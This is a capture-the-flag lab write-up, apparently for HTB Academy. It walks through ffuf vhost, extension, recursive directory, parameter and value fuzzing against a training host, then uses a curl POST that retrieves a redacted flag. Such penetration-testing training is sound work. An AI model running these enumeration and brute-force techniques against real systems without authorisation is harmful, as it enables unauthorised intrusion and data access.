## Full-Chain Web Enumeration & Directory Fuzzing From Bare IP to Parameter Exploitation
<br>

We are going to conduct a comprehensive web application penetration test against a target host. The initial scope was limited to a bare target IP address, with no prior information regarding the infrastructure, active subdomains, or back-end technologies:

<br>

<img width="625" height="193" alt="image" src="https://github.com/user-attachments/assets/c2bdb5dd-a58c-4cd9-b77c-fc50309fe7c7" />

<br>
<br>

## Initial Enumeration (Vhost Fuzzing)

<br>

The initial black-box reconnaissance phase required identifying active virtual hosts configured on the target web server.
Since the assessment took place within an isolated lab network, standard subdomain fuzzing via direct URL modification `http://FUZZ.DNS_NAME.htb` would fail due to DNS resolution constraints. To bypass this, **Vhost Fuzzing** was performed by manipulating the HTTP `Host` header, routing requests directly to the target IP address.

<br>

Let's add the given IP to our /etc/hosts file for Vhost enumeration:

<br>

<img width="572" height="176" alt="image" src="https://github.com/user-attachments/assets/503b58f6-189a-445c-8e2b-835348950665" />

<br>
<br>

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:<PORT> -H 'Host: FUZZ.academy.htb'
```

<br>

We can see that a standard response has `Size: 985`:

<br>

```bash
<snip...>
books                   [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 60ms]
phoenix                 [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 59ms]
drupal                  [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 59ms]
affiliate               [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 59ms]
www.wap                 [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 60ms]
webdisk.support         [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 59ms]
st                      [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 60ms]
<snip...>
```

<br>

Let's filter them out and see what we will get:

<br>

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:<PORT> -H 'Host: FUZZ.academy.htb' -fs 985
```

<br>

```bash
ar<...>                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 63ms]
te<...>                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3520ms]
fa<...>                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 61ms]
:: Progress: [4989/4989] :: Job [1/1] :: 662 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

<br>

<img width="574" height="286" alt="image" src="https://github.com/user-attachments/assets/d597cdbd-6635-4867-9884-dae2a11fb5ee" />

<br>

<br>

Before we start vhost fuzzing we need to add these vhosts to our /etc/hosts, so that we will be able to fuzz them using DNS name <vhost_name>.academy.htb:

<br>

<img width="577" height="191" alt="image" src="https://github.com/user-attachments/assets/92e7cd09-aae9-4b8e-83dc-f6e016e21f4a" />

<br>

<br>

## Directory & Content Discovery Using Recursive Fuzzing

<br>

Let's enumerate vhost's extensions:

<br>

**Note: we use indexFUZZ without a dot (.) because the file `web-extensions.txt` has the format `.extension`. If we put a dot we will fuzz for the malformed extensions (..php, ..phps, etc..)**

<br>

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://<vhost_1>.acade
my.htb:<PORT>/indexFUZZ
```

<br>

```bash
.phps                   [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 61ms]
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4266ms]
:: Progress: [43/43] :: Job [1/1] :: 10 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

<br>

<img width="478" height="40" alt="image" src="https://github.com/user-attachments/assets/c31087bb-42a7-4b3c-8d76-5d9f03c8238e" />

<br>

<br>


```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://<vhost_2>.acade
my.htb:<PORT>/indexFUZZ
```

<br>

```bash
.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 4824ms]
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4835ms]
:: Progress: [43/43] :: Job [1/1] :: 8 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

<br>

<img width="493" height="48" alt="image" src="https://github.com/user-attachments/assets/19a82f02-e378-4e96-9572-467a17d149bf" />

<br>

<br>

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://<vhost_3>.acade
my.htb:<PORT>/indexFUZZ
```
<br>

```bash
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 59ms]
.<secret_extension>                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 61ms]
:: Progress: [43/43] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

<br>

<img width="476" height="57" alt="image" src="https://github.com/user-attachments/assets/217349b2-a32f-428b-83dd-0064167d66f4" />

<br>

<br>

By the end of the fuzzing we have discovered 3 extensions the target web server has: `.php`, `.phps`, `.<secret_extension>`

<br>

### Directory & File enumeration

<br>

Now we know 3 vhosts and 3 extensions available. Let's do recurion fuzzing in each vhost for these extensions and see what we can get. We will use `common.txt` wordlist for inital fuzzing:

<br>

Fuzzing `vhost_1` and filtering 403 response code:

<br>

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://<vhost_1>.academy.htb:3
2722/FUZZ -v -recursion -t 100 -fc 403 -e .php,.phps,<secret_extension>
```

<br>

```bash
[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
| URL | http:/<vhost_1>.academy.htb:<PORT>/index.php
* FUZZ: index.php

:: Progress: [4750/4750] :: Job [1/1] :: 1666 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

<br>

<img width="510" height="73" alt="image" src="https://github.com/user-attachments/assets/ecb926a3-6879-487f-a402-8a3074f887fe" />

<br>

<br>

Fuzzing `vhost_2`:

<br>

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://<vhost_2>.academy.ht
b:<PORT>/FUZZ -v -recursion -t 100 -fc 403 -e .php,.phps,.<secret_extension>
```

<br>

```bash
[Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 59ms]
| URL | http://<vhost_2>.academy.htb:<PORT>/co<...>
| --> | http://<vhost_2>.academy.htb:<PORT>/co<...>/
* FUZZ: co<...>

[INFO] Adding a new job to the queue: http://<vhost_2>.academy.htb:<PORT>/co<...>/FUZZ

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
| URL | http://<vhost_2>.academy.htb:<PORT>/index.php
* FUZZ: index.php

[INFO] Starting queued job on target: http://<vhost_2>.academy.htb:<PORT>/co<...>/FUZZ

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
| URL | http://<vhost_2>.academy.htb:<PORT>/co<...>/index.php
* FUZZ: index.php

:: Progress: [4750/4750] :: Job [2/2] :: 1655 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

<br>

<img width="518" height="268" alt="image" src="https://github.com/user-attachments/assets/1d5d9317-0118-458c-b6c5-f801143d7170" />

<br>

<br>

Fuzzing `vhost_3`:

<br>

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://<vhost_3>.academy.ht
b:<PORT>/FUZZ -v -recursion -t 100 -fc 403 -e .php,.phps,.<secret_extension>
```

<br>

```bash
[Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 59ms]
| URL | http://<vhost_3>.academy.htb:<PORT>/co<...>
| --> | http://<vhost_3>.academy.htb:<PORT>/co<...>/
    * FUZZ: co<...>

[INFO] Adding a new job to the queue: http://<vhost_3>.academy.htb:<PORT>/co<...>/FUZZ

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
| URL | http://<vhost_3>.academy.htb:<PORT>/index.<secret_extension>
    * FUZZ: index.<secret_extension>

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
| URL | http://<vhost_3>.academy.htb:<PORT>/index.php
    * FUZZ: index.php

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
| URL | http://<vhost_3>.academy.htb:<PORT>/index.php
    * FUZZ: index.php

[INFO] Starting queued job on target: http://<vhost_3>.academy.htb:<PORT>/co<...>/FUZZ

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
| URL | http://<vhost_3>.academy.htb:<PORT>/co<...>/index.php
    * FUZZ: index.php

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
| URL | http://<vhost_3>.academy.htb:<PORT>/co<...>/index.<secret_extension>
    * FUZZ: index.<secret_extension>

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
| URL | http://<vhost_3>.academy.htb:<PORT>/co<...>/index.php
    * FUZZ: index.php

:: Progress: [19000/19000] :: Job [2/2] :: 1628 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

<br>

<img width="520" height="221" alt="image" src="https://github.com/user-attachments/assets/968c6007-4359-4454-ae62-543b55d09b43" />

<br>

<br>

## Deep Fuzzing

<br>

### Vhost 3 Deep Directory Fuzzing

The initial recursive fuzzing utilizing the `common.txt` wordlist successfully mapped the core structure, such as the `co<...>` directory. However, it failed to identify any endpoints returning explicit authorization errors `403 Access Denied`, which are crucial for further vector analysis.

Let's use a more comprehensive wordlist from `seclists` and fuzz each vhost deeply:

<br>

```bash
ffuf -w /usr/share/wordlists/<custom_wordlist>.txt:FUZZ -u http://<vhost_3>.academy.htb:<PORT>/FUZZ -v -recursion -t 100 -fc 403 -fs 0 -e .php,.phps,.<secret_extension>
```

<br>



This targeted approach allowed us to discover an additional endpoint:

<br>

```bash
[Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 61ms]
| URL | http://<vhost_3>.academy.htb:<PORT>/co<...>/<secret_file>.<secret_extension>
* FUZZ: <secret_file>.<secret_extension>

:: Progress: [350656/350656] :: Job [1/1] :: 1650 req/sec :: Duration: [0:03:38] :: Errors: 0 ::
```

<br>

<img width="535" height="68" alt="image" src="https://github.com/user-attachments/assets/9e34da40-b848-45b1-9ae4-0014dd8840ff" />

<br>

<br>

<img width="698" height="362" alt="image" src="https://github.com/user-attachments/assets/fb83f62e-0652-48cb-b0b8-812d85d1cd66" />

<br>

<br>

## Parameter Fuzzing

<br>

For parameter fuzzing we will use `burp-parameter-names.txt` wordlist:

<br>

**GET** parameter fuzzing:

<br>

**Note: we need to run fuzzing to see the default `Size` and then filter it out using `fs <size>` command. In this case the default size is `Size: 774`. We will do the same with POST fuzzing as well.**

<br>

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<vhost_3>.academy.htb:<PORT>/co<...>/<secret_file>.<secret_extension>?FUZZ=key' -fs 774
```

<br>

```bash
u<...>                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 59ms]
:: Progress: [6453/6453] :: Job [1/1] :: 651 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

<br>

<img width="506" height="32" alt="image" src="https://github.com/user-attachments/assets/452ecfff-a513-43a9-bb15-7e4ec112a751" />

<br>

<br>

We found 1 parameter `u<...>`. Now let's fuzz the same endpoint using  **POST** request:

<br>

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<vhost_3>.academy.htb:<PORT>/co<...>/<secret_file>.<secret_extension>' -X POST -d 'FUZZ=key' -H "Content-Type: applicat
ion/x-www-form-urlencoded" -fs 774
```

<br>

```bash
u<...>                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 58ms]
us<...>                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 60ms]
:: Progress: [6453/6453] :: Job [1/1] :: 668 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

<br>

<img width="505" height="45" alt="image" src="https://github.com/user-attachments/assets/ae21f1f9-8e35-4ea2-b458-dcb4bbc601a4" />

<br>

<br>

We have successfully exposed 2 parameters. Now we have to find the `value` of these parameters. One of them should contain the sensitive information (`flag`)

<br>

## Value Fuzzing

<br>

After identifying the key parameters `u<...>` and `us<...>`, the next logical step was to determine their valid values. While the application accepted inputs via both GET and POST requests, the POST parameter **`us<...>`** was prioritized for intensive value fuzzing:
<br>

First, a baseline check was executed to determine the default response size for invalid inputs, which returned `Size: 781`. We then excluded this size using the `-fs 781` flag:

<br>

```bash
ffuf -w /usr/share/wordlists/<custom_wordlist>.txt:FUZZ -u 'http://<vhost_3>.academy.htb:<PORT>/co<...>/<secret_file>.<secret_extension>' -X POST -d 'us<...>=FUZZ' -H "Content-Type: application/x-www-form-urlencoded" -fs 781
```

<br>

```bash
ha<...>                 [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 60ms]
:: Progress: [87644/87644] :: Job [1/1] :: 666 req/sec :: Duration: :: Errors: 0 ::
```

<br>

<img width="515" height="33" alt="image" src="https://github.com/user-attachments/assets/6529e902-a970-47ed-863a-d74499801a69" />

<br>

<br>

## Exploitation & Data Retrieval

<br>

With both the parameter name `us<...>` and its valid value `ha<...>` successfully verified, we can use `curl` POST request to interact with the back-end application logic and dump the sensitive data:

<br>

```bash
curl http://<vhost_3>.academy.htb:<PORT>/co<...>/<secret_file>.<secret_extension> -d 'us<...>=ha<...>' -H "Content-Type: application/x-www-form-urlencoded"
```

<br>


```bash
<div class='center'><p>HTB{...}</p></div>
<html>
<!DOCTYPE html>

<head>
<title>HTB Academy</title>
<style>
*,
html {
margin: 0;
padding: 0;
border: 0;
}

<snip...>
```

<br>

<img width="558" height="191" alt="image" src="https://github.com/user-attachments/assets/6962df86-60c6-4cfc-9bf8-350411b061f2" />

<br>

<br>

The full chain attack successfully escalated from a bare IP address to internal application mapping, parameter discovery, and final `flag` extraction.

<br>

